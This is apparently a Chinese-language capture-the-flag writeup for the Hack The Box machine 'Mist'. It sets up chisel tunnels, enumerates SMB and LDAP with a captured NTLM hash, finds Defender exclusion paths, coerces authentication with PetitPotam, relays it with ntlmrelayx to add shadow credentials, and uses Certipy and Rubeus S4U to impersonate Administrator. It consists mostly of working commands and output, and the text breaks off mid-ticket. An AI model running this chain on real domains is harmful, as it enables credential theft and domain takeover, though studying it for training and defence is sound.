PS C:\xampp\htdocs\files> .\chisel.exe client 10.10.14.22:8000 R:socks

root@kali: ~/hackthebox/machine/mist # ./chisel server -p 8000 --reverse                                                                                       [13:20:59]
2024/10/27 13:21:34 server: Reverse tunnelling enabled
2024/10/27 13:21:34 server: Fingerprint 85:a3:f8:c5:3d:55:2d:cb:d3:e2:48:62:8f:57:b6:e8
2024/10/27 13:21:34 server: Listening on http://0.0.0.0:8000
2024/10/27 13:30:49 server: session#1: tun: proxy#R:127.0.0.1:1080=>socks: Listening
```

``` bash
root•hackthebox/machine/mist» proxychains -q netexec smb localhost                                                                                             [13:31:39]
SMB         127.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
```

#### Enumeration
#### SMB

``` bash
root•hackthebox/machine/mist» proxychains -q netexec smb localhost -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --shares                             [13:32:02]
SMB         127.0.0.1       445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         127.0.0.1       445    MS01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9
SMB         127.0.0.1       445    MS01             [*] Enumerated shares
SMB         127.0.0.1       445    MS01             Share           Permissions     Remark
SMB         127.0.0.1       445    MS01             -----           -----------     ------
SMB         127.0.0.1       445    MS01             ADMIN$                          Remote Admin
SMB         127.0.0.1       445    MS01             C$                              Default share
SMB         127.0.0.1       445    MS01             Common Applications READ,WRITE
SMB         127.0.0.1       445    MS01             IPC$            READ            Remote IPC

root•hackthebox/machine/mist» proxychains -q netexec smb 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 --shares                       [13:33:39]
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
SMB         192.168.100.100 445    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9
SMB         192.168.100.100 445    DC01             [*] Enumerated shares
SMB         192.168.100.100 445    DC01             Share           Permissions     Remark
SMB         192.168.100.100 445    DC01             -----           -----------     ------
SMB         192.168.100.100 445    DC01             ADMIN$                          Remote Admin
SMB         192.168.100.100 445    DC01             C$                              Default share
SMB         192.168.100.100 445    DC01             IPC$            READ            Remote IPC
SMB         192.168.100.100 445    DC01             NETLOGON        READ            Logon server share
SMB         192.168.100.100 445    DC01             SYSVOL          READ            Logon server share
```

就共享访问而言。DC的主机名为DC01。我将这两个ip添加到我的/etc/hosts文件：

``` bash
192.168.100.100 DC01
192.168.100.101 MS01
```

#### Creating Machines

一种常见的滥用技术是在域中创建假机器，默认情况下，任何域用户最多可以创建10个假机器。通常我会使用如下方式查询：

``` bash
Get-AdObject -Identity ((Get-AdDomain).distinguishedname) -Properties ms-DS-MachineAccountQuota
```

不幸的是，这没有返回任何结果，因为这个主机上没有安装PowerShell AD模块。不过，我可以用LDAP查询做到这一点：

``` bash
PS C:\Windows\system32> $domain = ([ADSI]"LDAP://RootDSE").defaultNamingContext
PS C:\Windows\system32> $searcher = New-Object DirectoryServices.DirectorySearcher
PS C:\Windows\system32> $searcher.SearchRoot = "LDAP://$domain"
PS C:\Windows\system32> $searcher.Filter = "(objectClass=domainDNS)"
PS C:\Windows\system32> $searcher.PropertiesToLoad.Add("ms-ds-machineaccountquota") | Out-Null
PS C:\Windows\system32> $result = $searcher.FindOne()
PS C:\Windows\system32> $result

Path                  Properties
----                  ----------
LDAP://DC=mist,DC=htb {ms-ds-machineaccountquota, adspath}


PS C:\Windows\system32> $quota = $result.Properties["ms-ds-machineaccountquota"][0]
PS C:\Windows\system32> $quota
0
```

这里的结果是0，意味着我不能添加一台计算机。

也可以用netexec和上面收集的hash来检查这一点：

``` bash
root@kali:~/hackthebox/machine/mist
> proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M maq
[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/mremoteng.py: No module named 'lxml'
/usr/lib/python3/dist-packages/pypykatz/_version.py:11: SyntaxWarning: invalid escape sequence '\.'
  """
[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/wifi.py: No module named 'lxml'
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9
MAQ         192.168.100.100 389    DC01             [*] Getting the MachineAccountQuota
MAQ         192.168.100.100 389    DC01             MachineAccountQuota: 0
```

#### AV / AMSI Evasion

注意到AMSI阻止了我的PowerShell执行。Defender在运行：

``` bash
PS C:\> tasklist
...[snip]...
MsMpEng.exe                    848                            0    203,912 K
...[snip]...
NisSrv.exe                    3856                            0      5,424 K
...[snip]...
```

允许从AV中列出web文件夹并不罕见，这里就是这种情况。如果我将webshell复制到C:\programdata，它会复制，但在试图访问它时，Defender会启动并删除它：

所以我会在\xampp\htdocs\中做任何需要避免AV的事情。files目录是一个很好的地方，因为它不受清理命令的约束。

最初解决Mist之后，我发现了这篇文章[Peeking Behind the Curtain: Finding Defender’s Exclusions](https://blog.fndsec.net/2024/10/04/uncovering-exclusion-paths-in-microsoft-defender-a-security-research-insight/)，其中展示了作为普通用户枚举排除路径的方法。他们提到了一个使用事件日志的方法，它在PowerShell中有效：

``` bash
PS C:\Windows\system32> Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -FilterXPath "*[System[(EventID=5007)]]" | Where-Object { $_.Message -like "*Exclusions\Paths*" } | Select-Object -Property TimeCreated, Id, Message | Format-List


TimeCreated : 2/25/2024 5:36:45 AM
Id          : 5007
Message     : Microsoft Defender Antivirus Configuration has changed. If this is an unexpected event you should review
              the settings as this may be the result of malware.
                Old value:
                New value: HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions\Paths\C:\xampp\htdocs = 0x0
```

MpCmdRun.exe方法确认：

``` bash
PS C:\Windows\system32> & "C:\Program Files\Windows Defender\MpCmdRun.exe" -Scan -ScanType 3 -File "C:\xampp\htdocs\|*"
Scan starting...
Scan finished.
Scanning C:\xampp\htdocs\|* was skipped.
```

该目录被跳过了

#### LDAP Signing

``` bash
root@kali:~/hackthebox/machine/mist
> proxychains -q netexec ldap 192.168.100.100 -u brandon.keywarp -H DB03D6A77A2205BC1D07082740626CC9 -M ldap-checker
[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/mremoteng.py: No module named 'lxml'
[-] Failed loading module at /usr/lib/python3/dist-packages/nxc/modules/wifi.py: No module named 'lxml'
SMB         192.168.100.100 445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:mist.htb) (signing:True) (SMBv1:False)
LDAP        192.168.100.100 389    DC01             [+] mist.htb\brandon.keywarp:DB03D6A77A2205BC1D07082740626CC9
LDAP-CHE... 192.168.100.100 389    DC01             LDAP Signing NOT Enforced!
LDAP-CHE... 192.168.100.100 389    DC01             LDAPS Channel Binding is set to "NEVER"
```

#### PetitPotam Attack
#### 策略

由于没有启用LDAP签名，将使用PetitPotam工具强制Windows以MS01$机器帐户的身份验证回给我。这里有两个问题：

1. PetitPotam中使用的web客户端服务没有启动，所以我需要启动它。
2. 这种攻击需要一个DNS名称来表示机器帐户要进行身份验证的位置。不幸的是，没有我可以访问的帐户可以在域上创建DNS记录（这是一个非默认配置，但并非不切实际的配置）。使用隧道来瞄准MS01，并让它返回到我的主机。

一旦克服了这些问题，就可以让MS01$向我的主机进行身份验证了。使用Responder捕获此验证NetNTLMv2 hash，但由于机器帐户通常具有非常强的随机密码，因此这不会提供太多价值。可以将此攻击转发给DC以获得MS01$的访问权限并对该帐户进行更改。通常情况下，会在这里使用RBCD攻击，像在[support](https://0xdf.gitlab.io/2022/12/17/htb-support.html#shell-as-domainadmin)中一样使用假计算机，正如上面所示，无法将计算机添加到域中。相反，将使用ntlmrelayx（来自[Impacket](https://github.com/SecureAuthCorp/impacket)）中的LDAP shell向机器帐户添加shadow credential，从而允许完全破坏MS01。

#### Enable webclient

可以使用c#与[EtwStartWebClient.cs](https://gist.github.com/klezVirus/af004842a73779e1d03d47e041115797)启动服务。保存该文件并使用mono编译它(apt install mono-mcs)

``` bash
root@kali:~/hackthebox/machine/mist
> mcs EtwStartWebClient.cs /unsafe
root@kali:~/hackthebox/machine/mist
> file EtwStartWebClient.exe
EtwStartWebClient.exe: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows, 3 sections

PS C:\xampp\htdocs\files> Invoke-WebRequest -Uri http://10.10.14.22/EtwStartWebClient.exe -OutFile EtwStartWebClient.exe
PS C:\xampp\htdocs\files> .\EtwStartWebClient.exe
[+] WebClient Service started successfully
```

有一个清理作业可以非常快速地恢复此操作，因此需要在需要时再次运行它。

#### Tunnel

目前仅限于DC01和MS01。在MS01上启动一条隧道（选择一个任意高端口9001），并将其转发到我的主机上的post 80：

``` bash
.\chisel.exe client 10.10.14.22:8000 22301:127.0.0.1:80
```

 - ![](https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/Mist2.png)

``` bash
PS C:\Common Applications> curl 127.0.0.1:22301
PS C:\Common Applications> curl 127.0.0.1:22301

127.0.0.1 - - [27/Oct/2024 14:14:00] "GET / HTTP/1.1" 200 -
127.0.0.1 - - [27/Oct/2024 14:14:07] "GET / HTTP/1.1" 200 -
```

#### Attack Without Relay

使用这个[PetitPotam POC](https://github.com/topotam/PetitPotam)与exe和Python脚本。考虑到隧道，将使用Python脚本。以root身份运行，以避免奇怪的Python path/sudo交互，为brandon.keywarp赋予权限，和MS01@22301/whatever的目标作为主机，端口，和一个字符串，这里不重要：

``` bash
root@kali:~/hackthebox/machine/mist
> proxychains python /root/PetitPotam/PetitPotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb 'MS01@22301/whatever' 192.168.100.101 -pipe all
[proxychains] config file found: /etc/proxychains.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.17
/root/PetitPotam/PetitPotam.py:20: SyntaxWarning: invalid escape sequence '\ '
  show_banner = '''


              ___            _        _      _        ___            _
             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __
             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | '  \
            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_|
          _| """ |_|"""""|_|"""""|_|"""""|_|"""""|_| """ |_|"""""|_|"""""|_|"""""|_|"""""|
          "`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'"`-0-0-'

              PoC to elicit machine account authentication via some MS-EFSRPC functions
                                      by topotam (@topotam77)

                     Inspired by @tifkin_ & @elad_shamir previous work on MS-RPRN



Trying pipe efsr
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\efsrpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
Something went wrong, check error status => SMB SessionError: code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND - The object name is not found.
Trying pipe lsarpc
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsarpc]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
Trying pipe samr
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\samr]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
Trying pipe netlogon
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\netlogon]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
Trying pipe lsass
[-] Connecting to ncacn_np:192.168.100.101[\PIPE\lsass]
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.100.101:445  ...  OK
[+] Connected!
[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e
[+] Successfully bound!
[-] Sending EfsRpcOpenFileRaw!
[-] Got RPC_ACCESS_DENIED!! EfsRpcOpenFileRaw is probably PATCHED!
[+] OK! Using unpatched function!
[-] Sending EfsRpcEncryptFileSrv!
[+] Got expected ERROR_BAD_NETPATH exception!!
[+] Attack worked!
```

#### Relay

现在要把这个验证尝试发回给DC。将使用[Impacket的一个分支](https://github.com/Tw1sm/impacket/tree/interactive-ldap-shadow-creds)，它目前是一个[拉取请求](https://github.com/fortra/impacket/pull/1402)，原因我将在后面解释。运行ntlmrelayx开始收听：

``` bash
root@kali:~/hackthebox/machine/mist
> proxychains -q ntlmrelayx.py -debug -t ldaps://192.168.100.100 -i -smb2support -domain mist.htb
/usr/local/bin/ntlmrelayx.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html
  __import__('pkg_resources').run_script('impacket==0.10.1.dev1', 'ntlmrelayx.py')
Impacket v0.10.1.dev1 - Copyright 2022 SecureAuth Corporation

[+] Impacket Library Installation Path: /usr/local/lib/python3.12/dist-packages/impacket-0.10.1.dev1-py3.12.egg/impacket
[*] Protocol Client DCSYNC loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client RPC loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Protocol Client HTTP loaded..
[+] Protocol Attack SMB loaded..
[+] Protocol Attack IMAP loaded..
[+] Protocol Attack IMAPS loaded..
[+] Protocol Attack DCSYNC loaded..
[+] Protocol Attack HTTP loaded..
[+] Protocol Attack HTTPS loaded..
[+] Protocol Attack MSSQL loaded..
[+] Protocol Attack LDAP loaded..
[+] Protocol Attack LDAPS loaded..
[+] Protocol Attack RPC loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server on port 80
[*] Setting up WCF Server

[*] Setting up RAW Server on port 6666
[*] Servers started, waiting for connections
```

现在，启动web客户端，然后像以前一样运行PetitPotam。Ntlmrelayx看到：

``` bash
PS C:\xampp\htdocs\files> .\EtwStartWebClient.exe
[+] WebClient Service started successfully
root@kali:~/hackthebox/machine/mist
> proxychains python /root/PetitPotam/PetitPotam.py -u brandon.keywarp -hashes :DB03D6A77A2205BC1D07082740626CC9 -d mist.htb 'MS01@22301/whatever' 192.168.100.101 -pipe all

[*] HTTPD(80): Connection from 127.0.0.1 controlled, attacking target ldaps://192.168.100.100
[*] HTTPD(80): Authenticating against ldaps://192.168.100.100 as MIST/MS01$ SUCCEED
[*] Started interactive Ldap shell via TCP on 127.0.0.1:11000
[+] No more targets
[*] HTTPD(80): Connection from 127.0.0.1 controlled, but there are no more targets left!
```

连接shell

在上面提到的分叉中添加了两个选项：clear_shadow_creds和set_shadow_creds。

``` bash
mist % nc 127.0.0.1 11000
Type help for list of commands

# clear_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

Shadow credentials cleared successfully!

# set_shadow_creds MS01$
Found Target DN: CN=MS01,CN=Computers,DC=mist,DC=htb
Target SID: S-1-5-21-1045809509-3006658589-2426055941-1108

KeyCredential generated with DeviceID: fa92c37f-7183-c4a3-f386-1accf1db62f2
Shadow credentials successfully added!
Saved PFX (#PKCS12) certificate & key at path: MjKHWVpJ.pfx
Must be used with password: bELGL4DXebmGP91TSYgZ
```

#### Get MS01$ NTLM Hash

这个shadow credential经常被重置，所以使用它来获取机器帐户的NTLM hash。使用[Certipy](https://github.com/ly4k/Certipy)制作一个无密码保护的版本：

``` bash
~/hackthebox/machine/mist certipy cert -export -pfx pNxw0Isw.pfx -password 63VYxDTiyztHbwOQV63D -out ms01.pfx
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[*] Writing PFX to 'ms01.pfx'

~/hackthebox/machine/mist proxychains -q certipy auth -pfx ms01.pfx -domain mist.htb -username MS01\$ -dc-ip 192.168.100.100 -ns 192.168.100.100
Certipy v4.8.2 - by Oliver Lyak (ly4k)

[!] Could not find identification in the provided certificate
[*] Using principal: ms01$@mist.htb
[*] Trying to get TGT...
[*] Got TGT
[*] Saved credential cache to 'ms01.ccache'
[*] Trying to retrieve NT hash for 'ms01$'
[*] Got hash for 'ms01$@mist.htb': aad3b435b51404eeaad3b435b51404ee:25231b945c930613cd0a425c85901ad4
```

``` bash
mist % proxychains -q netexec smb MS01 -u 'ms01$' -H 25231b945c930613cd0a425c85901ad4
SMB         192.168.100.101 445    MS01             [*] Windows Server 2022 Build 20348 x64 (name:MS01) (domain:mist.htb) (signing:False) (SMBv1:False)
SMB         192.168.100.101 445    MS01             [+] mist.htb\ms01$:25231b945c930613cd0a425c85901ad4
```

这个hash将定期更改（默认情况下每24小时更改一次），并且每次启动时都会有所不同。

#### Shell as Administrator on MS01
#### Get Kerberos Ticket

我不能使用这个机器帐户的NTLM hash（或影子凭证）进行任何远程登录。但是，作为SMB（CIFS）服务的管理员，可以使用这个hash来获取服务票据。

Brandon.Keywarp的shell，使用rubeus获得一个Kerberos票据作为机器帐户：

``` bash
PS C:\xampp\htdocs\files> .\rubeus asktgt /nowrap /user:"ms01$" /rc4:25231b945c930613cd0a425c85901ad4

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: Ask TGT

[*] Got domain: mist.htb
[*] Using rc4_hmac hash: 25231b945c930613cd0a425c85901ad4
[*] Building AS-REQ (w/ preauth) for: 'mist.htb\ms01$'
[*] Using domain controller: 192.168.100.100:88
[+] TGT request successful!
[*] base64(ticket.kirbi):

      doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP6R+/Me9FSGGcBqMVPHOscpAfymkhO55xWQEYCImqAnnKhV0DUHith5D/6P5uXDhUtnVBqYbQg4uG2B4rNhZuGFlTk9iLlA8pgTvfGPZTKbZQcbqO8kA8P0zvT441FzrdjRPPMKj82jwuPZACf1UoC4rRagNqOYvS7rfELwpUhNTJmIXnYLrj9QklEyaq/1Wd0U3dYNvzoN9Q5thu8b+aTiPfduMUjR4iEggZ5OcGUxPXlTYm53Hf01/aLGisIs7qXhENdEUGf+NYQj/8HOJ2Kd1efYSLHF+NaUoVttpDmzZldrzfzLsHisZCX8VHTa1kgNmJplnZe/Ta00H8lSdcRK630rFjB0L5b22zg91FMBtOSeMXxlpAWOjH5L9pi33mtdwuUzPsjbcdlSxk+TJ/dAeLe4Z4k6WromkJ38Kx3DbQfQewDQVVqB9TqCAzraEpsqIJ8aQhIZB6Ryz+92gi74m0ByuxXChxL26cky84YxGvcoT89hWjx/xiVeMBQ14+zSOlEpVpoem7WyzmdT8ShakWknm2hTDagHnQVY2gQb6578VBtodHgnP6/i8/aTvQZOlqVLM0IuoaAZ0Q+vk9ld416rWi/LQ+dSpslrbtSw/W/RDiqqqIqtCfin3i/E9xLZ1BkvfZloT8egxG83nQRDON17Zk94OaWY7yr3XaAuBK5e794c1xk+rC6SNGVVmWVEaWiVjId7LCKVHNFNUcUtgeU23wuNHyJL2iIsPbsW3RF7aqnqNXwAGaG17nJJ24dinu1J3Rumw5iYKeviYuzqN8Efrnbis5tTKFw0h0lc0EngT52A9PtOO5c5+wAG9C3pXqqlUNchf1qIPzqnrnsKn/tS1+lNISCpnrpG250XTe6PJ1zYFAzxLiHTgW/fzRobkP6wdNey6kdmylBsHGX1bnFO133Xo2oW8afCaijNk+EOBuJ+ErjM6QJxfyphyxzlBLR/rUqqxUMMzzJx7r4ymbVQUVE4TvGmLHB9Zfa/eVWQbADaxmzRNPbM08U+6MTgTDo6+lLbEt4BQCmhFwHoS2NMu9tfEn+7xegOwsmp4LdciwRAjOjH9mpypg6aDUbvaOuSD08sQsTFJtqqinnKlciYIlK1+JgYukMSyppbdkKm2bIV5WJzL4rt6P7bhDdB6I/RPI8CcDvpwBPmNrasLx0cJgveGLHMqT3TttEj+xg9oDNkfrysQAiuxML+ql+wbBQqERvcrVVwbabRrOgBr8LC8bUCK5FngM3IKl4jpLGwq2o9dIE/DtBF1wxwhjkRvI78K3JgsqV+kgwKkciYdJmIPTV7iSO4NkZbshorWUojIaGNqbhHw+IdTGnRwsLmn8s0Dc7rRGKuKOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEIw2NcvqHsZgRgLdfukFtcmhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MTAyNzA3MTgxMFqmERgPMjAyNDEwMjcxNzE4MTBapxEYDzIwMjQxMTAzMDcxODEwWqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=

  ServiceName              :  krbtgt/mist.htb
  ServiceRealm             :  MIST.HTB
  UserName                 :  ms01$ (NT_PRINCIPAL)
  UserRealm                :  MIST.HTB
  StartTime                :  10/27/2024 12:18:10 AM
  EndTime                  :  10/27/2024 10:18:10 AM
  RenewTill                :  11/3/2024 12:18:10 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  rc4_hmac
  Base64(key)              :  jDY1y+oexmBGAt1+6QW1yQ==
  ASREP (key)              :  25231B945C930613CD0A425C85901AD4
```

把该票据返回给rubeus，使用s4u冒充MS01上的CIFS服务的管理员帐户请求票据：

``` bash
PS C:\xampp\htdocs\files> .\rubeus s4u /self /nowrap /impersonateuser:Administrator /altservice:"cisf/ms01.mist.htb" /ticket:doIFLDCCBSigAwIBBaEDAgEWooIEUDCCBExhggRIMIIERKADAgEFoQobCE1JU1QuSFRCoh0wG6ADAgECoRQwEhsGa3JidGd0GwhtaXN0Lmh0YqOCBBAwggQMoAMCARKhAwIBAqKCA/4EggP6R+/Me9FSGGcBqMVPHOscpAfymkhO55xWQEYCImqAnnKhV0DUHith5D/6P5uXDhUtnVBqYbQg4uG2B4rNhZuGFlTk9iLlA8pgTvfGPZTKbZQcbqO8kA8P0zvT441FzrdjRPPMKj82jwuPZACf1UoC4rRagNqOYvS7rfELwpUhNTJmIXnYLrj9QklEyaq/1Wd0U3dYNvzoN9Q5thu8b+aTiPfduMUjR4iEggZ5OcGUxPXlTYm53Hf01/aLGisIs7qXhENdEUGf+NYQj/8HOJ2Kd1efYSLHF+NaUoVttpDmzZldrzfzLsHisZCX8VHTa1kgNmJplnZe/Ta00H8lSdcRK630rFjB0L5b22zg91FMBtOSeMXxlpAWOjH5L9pi33mtdwuUzPsjbcdlSxk+TJ/dAeLe4Z4k6WromkJ38Kx3DbQfQewDQVVqB9TqCAzraEpsqIJ8aQhIZB6Ryz+92gi74m0ByuxXChxL26cky84YxGvcoT89hWjx/xiVeMBQ14+zSOlEpVpoem7WyzmdT8ShakWknm2hTDagHnQVY2gQb6578VBtodHgnP6/i8/aTvQZOlqVLM0IuoaAZ0Q+vk9ld416rWi/LQ+dSpslrbtSw/W/RDiqqqIqtCfin3i/E9xLZ1BkvfZloT8egxG83nQRDON17Zk94OaWY7yr3XaAuBK5e794c1xk+rC6SNGVVmWVEaWiVjId7LCKVHNFNUcUtgeU23wuNHyJL2iIsPbsW3RF7aqnqNXwAGaG17nJJ24dinu1J3Rumw5iYKeviYuzqN8Efrnbis5tTKFw0h0lc0EngT52A9PtOO5c5+wAG9C3pXqqlUNchf1qIPzqnrnsKn/tS1+lNISCpnrpG250XTe6PJ1zYFAzxLiHTgW/fzRobkP6wdNey6kdmylBsHGX1bnFO133Xo2oW8afCaijNk+EOBuJ+ErjM6QJxfyphyxzlBLR/rUqqxUMMzzJx7r4ymbVQUVE4TvGmLHB9Zfa/eVWQbADaxmzRNPbM08U+6MTgTDo6+lLbEt4BQCmhFwHoS2NMu9tfEn+7xegOwsmp4LdciwRAjOjH9mpypg6aDUbvaOuSD08sQsTFJtqqinnKlciYIlK1+JgYukMSyppbdkKm2bIV5WJzL4rt6P7bhDdB6I/RPI8CcDvpwBPmNrasLx0cJgveGLHMqT3TttEj+xg9oDNkfrysQAiuxML+ql+wbBQqERvcrVVwbabRrOgBr8LC8bUCK5FngM3IKl4jpLGwq2o9dIE/DtBF1wxwhjkRvI78K3JgsqV+kgwKkciYdJmIPTV7iSO4NkZbshorWUojIaGNqbhHw+IdTGnRwsLmn8s0Dc7rRGKuKOBxzCBxKADAgEAooG8BIG5fYG2MIGzoIGwMIGtMIGqoBswGaADAgEXoRIEEIw2NcvqHsZgRgLdfukFtcmhChsITUlTVC5IVEKiEjAQoAMCAQGhCTAHGwVtczAxJKMHAwUAQOEAAKURGA8yMDI0MTAyNzA3MTgxMFqmERgPMjAyNDEwMjcxNzE4MTBapxEYDzIwMjQxMTAzMDcxODEwWqgKGwhNSVNULkhUQqkdMBugAwIBAqEUMBIbBmtyYnRndBsIbWlzdC5odGI=

   ______        _
  (_____ \      | |
   _____) )_   _| |__  _____ _   _  ___
  |  __  /| | | |  _ \| ___ | | | |/___)
  | |  \ \| |_| | |_) ) ____| |_| |___ |
  |_|   |_|____/|____/|_____)____/(___/

  v2.3.2

[*] Action: S4U

[*] Action: S4U

[*] Building S4U2self request for: 'ms01$@MIST.HTB'
[*] Using domain controller: DC01.mist.htb (192.168.100.100)
[*] Sending S4U2self request to 192.168.100.100:88
[+] S4U2self success!
[*] Substituting alternative service name 'cisf/ms01.mist.htb'
[*] Got a TGS for 'Administrator' to 'cisf@MIST.HTB'
[*] base64(ticket.kirbi):

      doIF2jCCBdagAwIBBaEDAgEWooIE4zCCBN9hggTbMIIE16ADAgEFoQobCE1JU1QuSFRCoiAwHqADAgEBoRcwFRsEY2lzZhsNbXMwMS5taXN0Lmh0YqOCBKAwggScoAMCARKhAwIBA6KCBI4EggSKke6E8BoAvJtnLR7/u/fejKseTGn6+F3cB8Y1eTDWR31K2pFuPUBEsPMD115GZFTKzgnBdSY3vHYBGglZXvCf/AjZHpS9H4QdSX5CbP6Q68c0TEvktwcN+qbzJqIn/wbRgYfs2zrbzSLl/fF9PFnf6ixOBq8iWZ5CgtbcqlfXqJtjZSFq4TuHhmkFQXKKy7a9P7gSBCGypcuM1wGditIhNwWZW7czBTiFu3yaJvdwNZkQqsPGcyPEPz4/mr1oOB+Ac0CrxQ94eZ1DqGNqJqBx7vncNPaWQ0YmteoS985BzuGtMje5g8rmRjIgY/NtXrU2cb0c1wwp6JhNHRR8NWWo1q341QkmWuX7TsIMXFRkcNBEdQlDX8iIht0bbEY/GyAFDnS3j60LdSTBsKmdPOb7AF5pKZSfwBGpjrHICMm/0OOZegHPzi800YoE8IpYhzcSQyG2v6QYvvhWBQv7rQVQReY35Tr+AW8feI31I6vrcD1Bi3lcuKDxoukQi0LdoQrjBX8SkAhAQpcZ8oTT8ran1RZi0kEcbHD7UxHMmOdkXYBCwAR68i3muKbaq7j5556FGcRxYIIgMVAqa6mgcAaslmcponALc/qypnWZyJnPG/LSll6b5gpJNSpI7AZ4euKz4GkOWlU8SGUAjN6ZglTYnSm2MDWS7tV5IjCQ7r12Vv2a+InxXvG9iKh5Ul63/lgQwKXCPgeQofrawyXDYPE3aBO+ZfJXLCPGVl9FILxlh0BKttpd5xhlQ0/HB+a0shifgBTkIjP1QY+HfV46OEIU3f3zf8Sledx4bnkEyos+f17fwmmteslL4PhOsBUvkXLbMBnMtLrQdwtCwclAGE9xt8TJmv1On0dyS4o6BE4usAv/EwJOzCKWzhajhXFTtIZSijKEnIt4ygb4YUnkVFi0R+sGuJ9EfE2GMnDKglsVNyraDizX7srocx5w2BzQI21VLhmIp2Sy/+7EhIDN0D1O7xdK+CF3mHM1iaM1wP4YpkAXUF2fLe4FKYZDqa2sneHL3rmZq/ZA3LEKb5LGZp+FkpmrfrxWozLWcnNIGobsv87KVjQClRQEsdUiLr37xXu717NQ1Bd1ZwAx4m7NK0QB8CBOqqs5lVffybyMbgngl2OSk+lhgvz69fOR9vevKfnx3iBNeAPGxch5KptEK8xWwdpS5